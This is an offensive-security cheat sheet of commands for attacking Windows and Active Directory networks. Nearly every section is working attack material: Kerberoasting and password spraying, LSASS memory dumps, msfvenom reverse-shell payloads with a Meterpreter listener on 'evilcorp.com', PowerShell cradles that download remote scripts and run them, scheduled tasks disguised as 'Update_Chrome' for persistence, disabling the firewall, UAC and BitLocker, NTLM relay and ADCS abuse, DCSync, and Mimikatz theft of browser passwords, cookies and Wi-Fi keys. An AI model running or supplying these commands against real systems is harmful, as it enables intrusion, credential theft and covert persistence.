## Kerberoast
```
GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <TGSs_file>
```

## ASRepRoast
```
GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <AS_REP_file>
```
## Password Policy (current user)
```
net accounts /domain
```

## Password Spraying with CME
```
cme smb <ip> -U <users_file> -p <password> -d <domain> --continue-on-success
```

## Password spraying with Kerberos (not logged by default on Windows Server)
```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```
## AMASS (passive recon)
```
amass enum -passive -o amass-passive.txt -d <domain>
```
## AMASS (active + brute force)
```
amass enum -active -brute -min-for-recursive 4 -d <domain> -o amass-active.txt
```
## Aquatone
Install Chromium before with : sudo snap install chromium and add screenshot/ output option:
```
cat URLs.txt| ./aquatone --ports xlarge --screenshot-timeout 300000 --scan-timeout 6000 -out screenshots/
```
## NMAP
TCP all ports
```
nmap -sS -n -Pn --open -p- -iL <file_with_ips> -oN <output_file>
```
UDP top 1000
```
nmap -sU -n -Pn --open --top-ports 1000 -iL <file_with_ips> -oN <outputfile>
```
SSH brute force/common pass
```
nmap -p22 --script ssh-brute -iL IPs.txt -oN nmap-SSHDefaultPass.txt --script-args brute.credfile=ssh-betterdefaultpasslist.txt --script-args ssh-brute.timeout=5s
```
https://nmap.org/nsedoc/scripts/ssh-brute.html

HTTP common pass
```
nmap -p80,443,4443,8443,8080 --script http-default-accounts -iL IPs.txt -oN nmap-httpDefaultAccounts.txt
```
https://nmap.org/nsedoc/scripts/http-default-accounts.html

## Powershell Port scanner
```
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
```
## Powershell Port scanner (scan a subnet for common HTTP ports only)
```
1..254 | % { $a = $_; 80,443,8000,8080,8443 | % {$test= new-object system.Net.Sockets.TcpClient; $wait =$test.beginConnect("172.31.30.$a",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo "$_ open"}}} | select-string " "
```
## Powershell egress port scanner
source : https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/
```
21,22,23,25,53,80,81,135,139,389,443,445,3389,8080 | % {$test= new-object system.Net.Sockets.TcpClient; $wait =$test.beginConnect("allports.exposed",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo "$_ open"}else{echo "$_ closed"}} | select-string " "
```
## Powershell Remote Session
https://www.faqforge.com/windows/create-powershell-session-remote-computer/
```
$creds=Get-Credential
$session = New-PSSession -Credential $creds -ComputerName <computer>
Enter-PSSession $session
<Run commands>
Exit-PSSession
Remove-PSSession $session
```
## Get Bitlocker Status via Powershell
``` 
Get-BitLockerVolume
```
## Disable Bitlocker via Powershell (as admin)
```
Disable-Bitlocker -MountPoint "C:"
```
## nslookup
```
nslookup -q=mx <hostname>
nslookup -type=ANY _ldap._tcp.dc._msdcs.<DOMAIN>
```
## Bloodhound
```
neo4j console &
bloodhound &
```
## AzureHound
source: https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350
```
install-module -name Az -allowclobber
install-module -name AzureADPreview -allowclobber
connect-azuread
connect-azaccount
import-module .\AzureHound.ps1
Invoke-AzureHound
```
## Bloodhound Ingestors (ps1)
Source : https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
```
Import-Module .\SharpHound.ps1
Invoke-BloodHound -collectiondmethods all
# Bloodhound Custom queries
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
```
## Privesc Check
Source: https://github.com/itm4n/PrivescCheck
```
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Report PrivescCheck -Format HTML
```
## XFreeRDP
```
xfreerdp /v:<ip> /u:<user> /d:<domain> /dynamic-resolution /pth:NTLM
```

## Smbclient
```
smbclient //ip/share$ -U user -W domain
```

## WMIExec
```
wmiexec.py <domain>/<username>:<password>@<ip>
```

## Dump
```
prcodump64.exe -accepteula -64 -ma <processname_or_pid> <output.dmp>
TaskMgr : righ-click : "Create dump file"
comsvcs.dll dump process
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```
## MSFVenom : Windows x64 Stageless
```
msfvenom -p windows/x64/meterpreter_reverse_https lhost=eth0 lport=443  -f <format> -o <output_file> --encrypt=<type> --encrypt-key "<key>" -e <encoder> -i <iterations>
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.131 LPORT=443 -f raw -o shellcode.raw --encrypt=xor --encrypt-key "\x22" 
```
## MSFVenom : Windows x64 Staged
```
msfvenom -p windows/x64/meterpreter/reverse_https lport=443 lhost=<host> -f <format> -o <output_file> -e <encoder> -i <iterations>
```
## Meterpreter Stageless Listener with SSL cert + disable autoloadstdapi
```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set lport 443
set lhost evilcorp.com
set exitonsession false
set EnableStageEncoding true    # use with Staged
set stageencoder x64/xor        # use with Staged
set stageencodingfallback false # use with Staged
set stagerverifysslcert true
set HANDLERSSLCERT /evilcorp-msf-cert.pem
set autoloadstdapi false
set verbose true

run -j
```
## Meterpreter : exec command
```
execute -i -f <command_on_remote_host> -a <arguments>
execute -i nslookup -a hostname
```

## Meterpreter : migrate to process NAME
```
migrate -N <process_name>
```
## Meterpreter : list x64 process only
```
ps -A x64
```
## Meterpreter : import PS1 script
```
load powershell
powershell_import /root/tools/PowerView.ps1
powershell_execute Get-NetDomain
```

## Execute-Assembly
Metasploit(x64 only, migrate b4 if required):
```
use post/windows/manage/execute_dotnet_assembly
set ARGUMENTS -group=user
set DOTNET_EXE /<snip>/Seatbelt.exe
set PROCESS notepad.exe
set SESSION #
```
## Certbot
```
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
sudo certbot --apache --register-unsafely-without-email --agree-tos -d <YOUR_DOMAIN>
```
## SMBPipe
Source : https://medium.com/@petergombos/smb-named-pipe-pivoting-in-meterpreter-462580fd41c5
```
pivot add -t pipe -l PIPEHOST -n PIPENAME -a <x86 or x64> -p windows 
```
## Get SMB Pipe on host to blend in 
Powershell:
```
get-childitem \\.\pipe\
or for older OS 
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
```
## List MiniFilter drivers
Source: https://ss64.com/nt/fltmc.html
```
FLTMC filters
```
## SED-foo
Remove empty lines from file
```
sed '/^[[:space:]]*$/d' File_with_empty_lines.txt > File2.txt 
```
Append text at the end of each lines of a file
```
sed 's/$/texthere/' filename > output.txt
```
## Cut delimiter with TAB then sorted-unique to a file
```
cat subdomain.txt|cut -d $'\t' -f 1|sort -u > subdomain-url.txt
```
## Display the top 10 IP from Apache access.log file from lines that contains HTTP
```
sudo cat /var/log/apache2/access.log | grep "HTTP" | awk '{print $1}' |  sort -n | uniq -c | sort -rn | head
```
## Display the top 20 biggest files
```
sudo du -a / | sort -n -r | head -n 20
```
## Add Date/Time to ZSH prompt
Add this line at the end of your ~/.zshrc then . ~/.zshrc
```
PROMPT='%{$fg[yellow]%}[%D{%y/%m/%f %T}] '$PROMPT
```
## Execute a command for each lines returned by the previous command:
```
locate -i file | xargs -n1 ls -l
```
## Pivoting with MSF after meterpreter session is opened
```
1) in Metasploit
use auxiliary/server/socks5
run -j
2) in Metasploit
route add <subnet_from_internal_subnet_of_session> <session_#>
ex: route add 10.0.0.0/8 1
3) edit file
# /etc/proxychains.conf
socks5 127.0.0.1 1080
4) from cmd line
proxychains <command>
```
## SSH reverse tunnel from OpenSSH installed on Windows since 2018
Upload the id_rsa on the victim host and make sure the access right are not too permissive then establish the tunnel back to the SSH server, exposing the port 8888. Configure proxychains to point to port 8888 on the SSH server.
```
icacls C:\Users\User1\Documents\test\id_rsa /inheritance:r /grant DOMAIN\User1:F
ssh.exe -oStrictHostKeyChecking=no -i C:\Users\User1\Documents\test\id_rsa sshuser@ssh.server.com -NR 8888
```
## Validate if SSH MitM / deep packet inspection is activated by comparing the FingerprintHashes from the client vs the server
From your SSH server:
```
ssh-keygen -l -v -E md5 -f /etc/ssh/ssh_host_ecdsa_key.pub
```
From the client / victim PC:
```
ssh -o visualhostkey=yes -o FingerprintHash=md5 Your_Server_IP
```
## Reverse Socks proxy with Chisel 
```
chisel client http://WANIP:443 R:0.0.0.0:8888:socks
chisel server --port 443 --reverse -v
```
## List SSH sessions and details (Ubuntu)
```
loginctl
loginctl show-session <id#>
loginctl session-status <id#>
loginctl terminate-session <id#>
```
## Compile Go executable for Windows x64 using Garble
https://github.com/burrowers/garble
```
# By example, lets compile Chisel with Garble
env GOOS=windows GOARCH=amd64 /home/kali/go/bin/garble build github.com/jpillora/chisel
```

## GPP
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
## GPO audit with Grouper2
Source : https://github.com/l0ss/Grouper2
```
grouper2.exe -g -i 8 -f grouper2_output.html [-d DOMAIN -u USERNAME -p PASSWORD]
```
## ADExplorer via CLI
```
ADExplorer64.exe -accepteula -snapshot "" <domain_snapshot.dat>
```
## AD Audit with PingCastle
```
PingCastle.exe --healthcheck --server domain.local
```
## WMIC Local/RCE
```
wmic process call create "cmd.exe /c calc.exe"
wmic /user:USERNAME /password:Password /node:"COMPUTER" process call create "c:\windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe PAYLOAD"
```
## WMIC List users from Group
```
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
```
## wmic list softwares
```
wmic product get name, version, vendor
```
## Get OS Version (powershell/wmi)
```
(Get-WmiObject -class Win32_OperatingSystem).Caption
or
[System.Environment]::OSVersion.Version
```
## WMIC Domain/DC Infos
```
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
```
## Get Digital Signature details (issuer to determine if signed by MS for blockdlls) from exe or dll (powershell)
https://support.moonpoint.com/os/windows/digital_signature.php
```
# Windows :
(get-authenticodesignature c:\windows\system32\cmd.exe)|fl
```
```
Source : https://unix.stackexchange.com/questions/269906/how-can-i-extract-signatures-data-from-a-windows-exe-file-under-linux-using-cl
# Linux :
osslsigncode verify beautiful.exe
```
## List files details/properties via Powershell
```
Get-Item -Path c:\windows\system32\FILE.dll | FL *
```
## Firewall
runasadmin
source: https://www.windows-commandline.com/enable-disable-firewall-command-line/
```
netsh advfirewall show currentprofile
netsh advfirewall set allprofiles state off
```
## Query / Disable / Enable / Stop / Start Services from CLI
source: https://newbedev.com/how-to-disable-feature-that-opened-port-445-on-windows-server
source: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config
```
sc query spooler
sc config lanmanserver start=disabled  # Reboot!
sc config lanmanserver start= auto
sc stop spooler
sc start lanmanserver
```
## Query / Stop / Start Services from Powershell
```
get-service
# Get-Service name even if the name is too long:
get-service | where {$_.name -match "spooler"}  | sort-object Status -desc | ft -auto
stop-service -name "Service_Name_Here"
start-service -name "Service_Name_Here"
```
## Disable Remote UAC - LocalAccountTokenFilterPolicy
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
```
## Port redirection with netsh
``` 
netsh interface portproxy add v4tov4 listenaddress=192.168.1.100 listenport=445 connectaddress=192.168.10.200 connectport=445
```
## Scheduled tasks (schtasks)
Create(as admin/system):
```
schtasks /create /tn "Update_Chrome" /tr "c:\windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe evil.txt" /np /sc DAILY /st 15:15 /f /RI 60 /du 48:00 /ru SYSTEM
```
Create(as user):
```
schtasks /create /tn "Update_Chrome2" /tr "c:\windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe evil.txt" /sc DAILY /st 15:15 /f /RI 60 /du 48:00
```
Create(as user) run even if user is not logged on(to test):
```
schtasks /create /tn "Update_Chrome3" /tr "c:\windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe evil.txt" /np DAILY /st 15:15 /f /RI 60 /du 48:00
```
Create a Hidden Scheduled Task (as the current user) using VBS (to hide window) and execute it when the user logon (import via XML)
```
cmd.exe /c echo CreateObject("Wscript.Shell").Run "c:\user\user1\evil.exe c:\user\user1\evil.txt", 0, false > Chrome_Update4.vbs
upload Task.xml
schtasks /create /tn "Update_Chrome4" /xml Task.xml
```
Query/Verify if exists (or if AV blocked it):
```
schtasks /query /fo list /tn Update_Chrome
```
List all Tasks available at root via Powershell:
```
Get-ScheduledTask -TaskPath "\"
```
Delete:
```
schtasks /delete /tn Update_Chrome /f
```
## Playing with Registry (aaand WDigest)
Query
```
CMD:
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
PS1:
Get-Item -path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```
Add
```
CMD:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
PS1:
Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
```
Delete
```
CMD:
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /f
PS1:
Remove-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
```
## Force user to Lock his session 
(to validate : must be spawned into a process of the targeted user ?)
```
Rundll32.exe user32.dll,LockWorkStation
```
## LDAPSearch example
extract all enabled users to file
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=person)(objectClass=user)(\!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" sAMAccountName -D "user@domain.local" -W |grep -i samaccountname |cut -d " " -f 2 > users-enabled.txt
```
extract all enabled users AND description to file
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=person)(objectClass=user)(\!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" '*' -D "user@domain.local" -W |grep -i "samaccountname\|description" > users-enabled-description.txt
```
extract all Domain Admins samaccountname
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=domain,dc=local)" sAMAccountName -D "user@domain.local" -W |grep -i samaccountname |cut -d " " -f 2 > DA.txt
``` 
extract all Domain Controllers to file
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |cut -d " " -f 2 > dc-host.txt
```
extract all enabled computers
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |cut -d " " -f 2 > computers-enabled.txt
```
extract all SRV2003 enabled
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=computer)(operatingSystem=Windows Server 2003*)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName -D "user@domain.local" -W|grep -i samaccountname |grep -i samaccountname |cut -d " " -f 2 > srv2003-enabled.txt
```
List all GPOs
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(objectCategory=groupPolicyContainer)" -D "user@domain.local" -W "displayName"
```
extract GPO name based on GUID
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=groupPolicyContainer)(name={1234B781-ACE0-1A84-BCF9-FE7BBA112D7D}))" displayname -D "user@domain.local" -W|grep -i displayname
```
extract LAPS password available to the user executing the command
```
ldapsearch -x -b "DC=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd -D "user@domain.local" -W > LAPS.txt
```
Check ms-DS-MachineAccountQuota (default is 10)...allows users to add computers to the Domain
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip_here -s sub -E pr=30000/noprompt "(objectclass=domain)" -D "user@domain.local" -W |grep -i "ms-ds-machineaccountquota"
```
extract Subnets and Sites
```
ldapsearch -x -H ldap://dc_ip_here -b "CN=Subnets,CN=Sites,CN=Configuration,dc=domain,dc=local" -D "user@domain.local" -W "" siteObject
```
extract KRBTGT pwdLastSet value
```
ldapsearch -x -b "dc=domain,dc=local" -H ldap://dc_ip -s sub -E pr=30000/noprompt "(samaccountname=KRBTGT)" pwdlastset -D "user@domain.local" -W |perl -pne 's/(\d{11})\d{7}/scalar(localtime($1-11644473600))/e'|grep -i "pwdLastSet:"
```
## Add/Join Computer to Domain
SharpMad / PowerMad
https://github.com/Kevin-Robertson/Sharpmad
```
Sharpmad.exe MAQ -Action new -MachineAccount COMPUTER -MachinePassword PASSWORD
```
## MitM with arpspoof
1- Make sure ip forwarding is activated (1 = activated)
```
sysctl net.ipv4.ip_forward
sysctl -w net.ipv4.ip_forward=1
or
cat /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward
```
2- Run arpspoof with timeout command, if you fail, at least the arpspoof will stop after the timeout delay chosen
```
timeout <#min> arpspoof -i <iface> -c both -t <target_ip> -r <gateway_ip> 
timeout 15 arpspoof -i eth0 -c both -t 192.168.1.100 -r 192.168.1.1
```
## Capture packets with tcpdump and save to file (useful with MitM)
```
tcpdump -s 0 -i eth0 -w output.pcap
```
## Analyze pcap with PCredz
Source: https://github.com/lgandx/PCredz
```
python3 Pcredz -f output.pcap
```
## mitm6
Source : https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
Source : https://luemmelsec.github.io/Relaying-101/
```
ntlmrelayx.py -ip 10.10.10.10 -wh evilwpad -t ldaps://10.10.10.20
sudo mitm6 -i eth0 -d domain.local
```
## Extract DNS queries from a PCAP and count each occurences
``` 
tshark -nr Your.pcap -T fields -e dns.qry.name |sort |uniq -c
```
## Capture Packets directly from Powershell during 60sec and output to ETL
``` 
# Source : https://devblogs.microsoft.com/scripting/packet-sniffing-with-powershell-getting-started/
function Capture
{
	# Create Session
	New-NetEventSession -Name "Session1" -CaptureMode SaveToFile -LocalFilePath ((get-location).tostring() + "\PacketsCaptureOutput.etl")
	# Add Provider to previously created session
	Add-NetEventPacketCaptureProvider -SessionName "Session1" -TruncationLength 512
	# Start Capture
	Start-NetEventSession -Name "Session1"
	# Get info about the session
	#Get-NetEventSession
	# Run X time then Stop
	Start-Sleep -seconds 60
	Stop-NetEventSession -Name "Session1"
	# Remove Session
	Remove-NetEventSession -Name "Session1"
	# Make sure no more sessions are running
	#Get-NetEventSession
}
```
## Convert ETL to PCAP
```
# Source : https://github.com/microsoft/etl2pcapng.git
etl2pcapng.exe in.etl out.pcapng
```
## Inveigh (admin)
```
Invoke-inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```
## Inveigh (user)
```
Invoke-inveigh -ConsoleOutput Y -NBNS Y
```

## Inveigh-Relay
```
Invoke-inveighrelay -consoleoutput y -target <IP_comma_separated> -showhelp n -statusoutput y -command "cmd.exe net localgroup administrators <DOMAIN\USER> /add" 
```
## Responder
```
Responder -I eth0 -rdw
```

## SMB_relay
Source : https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
```
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c <command>
```

## SeatBelt
```
seatbelt.exe -group=user
Seatbelt.exe -group=system -outputfile="C:\seatbelle-as-adminORsystem.txt"
```
## PowerUp
```
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```
## PowerLessShell
Source : https://github.com/Mr-Un1k0d3r/PowerLessShell
```
python PowerLessShell.py powershell.ps1 output
```
## Modify hash of Signed bin
Source : https://github.com/Mr-Un1k0d3r/Windows-SignedBinary

## Powershell : download craddle iex
```
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://HOSTNAME/yolo-x64-stageless.txt')|iex
```
## Powershell 
```
powershell -execb -nop -w hidden -c "<commands>"
Get-Process
Get-Service
# PowerShell 3.0+
IEX (iwr 'https://yolo/evil.ps1')
...
```
## Powershell Version
```
$psversiontable
```
## .Net Version CLR
```
%WINDIR%\Microsoft.Net\Framework\v4.0.30319\System.dll
```
## Unconstrained delegation : SpoolSample bug + Rubeus
todo...
## ADCS + PetitPotam NTLM Relay (ESC8)
Source : https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate

ntlmrelayx:
```
examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
PetitPotam:
```
python3 PetitPotam.py -d <Domain> -u <Username> -p <'Password'> ntlmrealy_ip DC_IP <-pipe efsr>
```
Rubeus import bas64 encoded cert:
```
Rubeus.exe asktgt /outfile:kirbi /user:DC$ /ptt /certificate:base64
```
## Print Spooler bug
```
SpoolSample_v4.5_x64.exe targetip attackerip
```
## Capture and downgrade to NTLMv1 hashes from PetitPotam or SpoolerBug to Responder
```
sudo responder -I eth0 --lm -b --disable-ess
```
## KrbRelayUp
``` 
KrbRelayUp.exe relay -d domain.local -CreateNewComputerAccount -ComputerName krbrelayup$ -ComputerPassword Pass123!
KrbRelayUp.exe spawn -d domain.local -cn krbrelayup$ -cp Pass123! -sc "cmd /c C:\Users\user\payload.exe"
```
## Computer Account to Domain Controller Privesc (dnsHostName abuse, CVE-2022-26923)
```
proxychains -q certipy account create 'domain.local/user:Password@dc01.domain.local' -user 'cve2022-26923' -dns 'dc01.domain.local'
proxychains -q certipy req 'goat.local/cve2022-26923$:h5<SNIP>BE@ADCS_IP' -ca domain-ADCS-CA -template Machine -debug
proxychains -q certipy auth -pfx dc01.pfx 'DC_IP@domain.local'
```
## Searching AD CS templates with Certipy via SOCKS proxy 
```
proxychains -q certipy find -u 'user@domain.local' -debug -ns ip -dc-ip ip -dns-tcp -scheme ldap
```
## Exploiting RBCD Using a Normal User Account
```
sources : 
https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html?m=1
https://twitter.com/snovvcrash/status/1525881994055503877?s=21&t=Q5wxCit0tLZjR6l-6YVnRg
# 1- Ask TGT
Rubeus.exe asktgt /user:username /rc4:123123123123 /nowrap
# 2- Ask TGS
Rubeus.exe asktgs /service:username@domain.local /enterprise /targetuser:administrator /nowrap /ticket:doIFaaaaaaaa
# 3- Convert NT hash to long term key - with Python script
import base64,hashlib
hashlib.new('md4', base64.b64decode('testtesttesttest==')).hexdigest()
# 4- Change user's NT hash to long term key 
smbpasswd.py domain.local/username@ip -newhashes :longtermHashObtainedPreviously -altuser DOMAIN/administrator -altpass 'newpass' -admin
# 5- S4U2proxy attack using user's TGT 
Rubeus.exe s4u /msdsspn:host/SPN.domain.local /nowrap /ticket:doIF..... 
```
# dump AD / DCSync (OPSec tip : dumping from a non DC host is sus AF)
proxychains -q crackmapexec smb DC_IP -u dc$ -H d4<SNIP>9 --ntds
## Raw shellcode to C
"Another way to do big shellcode to C array. Puts it right into the correct format, variable names, braces, length, the whole bit. Then you just include shellcode.h"
Source : "Solomon Sklash#7922" (Discord)
```
xxd -i shellcode.bin > shellcode.h
```
## Starting a WebDAV server and reaching it
```
 sudo davserver -P 80 -H 0.0.0.0 -n -D ./share/
 sudo davserver3 -P 80 -H 0.0.0.0 -n -D ./share/
  \\webdavserver@80\share\file.lnk
```
## Running Rubeus into a non Domain joined computer
On Windows you can use a tool called Proxifier to proxify your trafic like proxychains...make sure it runs as system and for all users and processes
https://www.proxifier.com/download/
```
runas /netonly /user:domain.local\username cmd.exe
Rubeus.exe asktgt /user:username /password:Password /domain:DOMAIN.LOCAL /dc:DC_IP_HERE /ptt
```
## Mimikatz commands:
Read saved passwords from Chrome
```
dpapi::chrome /in:"c:\users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
Read Cookies from Chrome
Source: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
```
dpapi::chrome /in:"c:\users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies"
```
Extract passwords from Scheduled Tasks
Source: https://github-wiki-see.page/m/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials
```
mimikatz vault::cred /patch
```
Extract Wi-Fi passwords
Source : https://tools.thehacker.recipes/mimikatz/modules/dpapi/wifi
```
dpapi::wifi /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{xxxx-xxxx-xxx...}\{xxxx-xxx-xxx-*}.xml" /unprotect
```
Extract Master DPAPI Key (run as System or high privs)
Source : https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi
``` 
sekurlsa::dpapi
```
## LOLBINS
Source : 
https://lolbas-project.github.io/#  
https://gtfobins.github.io/

Exec
```
c:\windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe PAYLOAD
wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\users\user1\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
wlrmdr.exe -s 3600 -f 0 -t Click me! -m To run calculator -a 11 -u calc.exe
```
Download
```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
Encode
```
certutil -encode inputFileName encodedOutputFileName
```
Decode
```
certutil -decode encodedInputFileName decodedOutputFileName
```
## Sign your Exe/Dll with a untrusted cert
Sign your binary with a previously created PFX file
```
"C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe" sign /f key.pfx /p key_password /fd SHA256 malicious.exe
```
### FFUF
https://github.com/ffuf/ffuf#example-usage
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://target/FUZZ -H "User-Agent: U-A_String_Here" -of html -o ffuf-target.html
```
### Antivirus
Defender : List exclusions (requires Admin rights...in latest version)
```
Get-MpPreference | Select-Object -expand ExclusionPath
```
## DLL Hijacking
Windows Userland applications (aka AppData...good for DLL hijacking)...use ProcMon to find hijackable DLLs :
``` 
Slack
Spotify
Teams
OneDrive
BurpSuitePro
```
## Execute MSBuild via Powershell
```
$path = "C:\Users\administrator\Desktop\bonjour.txt"
[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
$eval = new-object Microsoft.Build.Evaluation.Project($path);
$eval.Build();
```
## WPScan / WordPress
Enum Vulnerable Plugin (agressive)
```
cat wordpress-domains.txt | while true ; do read url; if [ "" = "$url" ] ; then break; fi ; wpscan --url $url --enumerate vp --plugins-detection aggressive --random-user-agent --api-token TOKEN --force -f cli-no-colour --no-banner >> wordpress-output.txt ; done
```
## ProxyLogon / ProxyShell / ProxyNotShell / TabShell
```
Get version with Burp Intruder:	
GET /ecp/15.0.1497.§§/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1

TabShell : CVE-2022-41080, CVE-2022-41082, CVE-2022-41076
Post-Auth RCE for ProxyNotShell which allows breaking out of the restricted Powershell Sandbox after you have successfully gained access through OWASSRF
Exchange 2013,16,19 till 08.11.2022 patch, this exploit bypasses Microsoft Hotfix from October 2022--> https://github.com/balki97/OWASSRF-CVE-2022-41082-POC
	
ProxyNotShell : CVE-2022-41040, CVE-2022-41082
This exploit only support Exchange Server 2019 (from MSF)

ProxyShell : CVE-2021-34473, CVE-2021-34523, CVE-2021-31207
This vulnerability affects Exchange 2013 CU23 < 15.0.1497.15, 
  Exchange 2016 CU19 < 15.1.2176.12, Exchange 2016 CU20 < 15.1.2242.5, 
  Exchange 2019 CU8 < 15.2.792.13, Exchange 2019 CU9 < 15.2.858.9.(from MSF)

ProxyLogon : CVE-2021-26855 then CVE-2021-27065
This vulnerability affects 
  (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 
  15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 
  CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).(from MSF)

```
## Wordlist generation with John The Ripper
``` 
john -wordlist:/home/ubuntu/wordlist1.txt -rules:l33t -stdout > wordlist1_l33t.txt
```
## SNMP
```
onesixtyone -c ~/common-snmp-community-strings-onesixtyone.txt 	IP_HERE
```
SNMPv3 
```
snmpwalk -v 3 -n '' -l noAuthNoPriv -u "snmpuser" IP_HERE 1.3.6.1.2.1.1.5
``` 
SNMPv3 user enum / brute force
https://github.com/hatlord/snmpwn
```
./snmpwn.rb --hosts hosts.txt --users users.txt --passlist passwords.txt --enclist passwords.txt
	
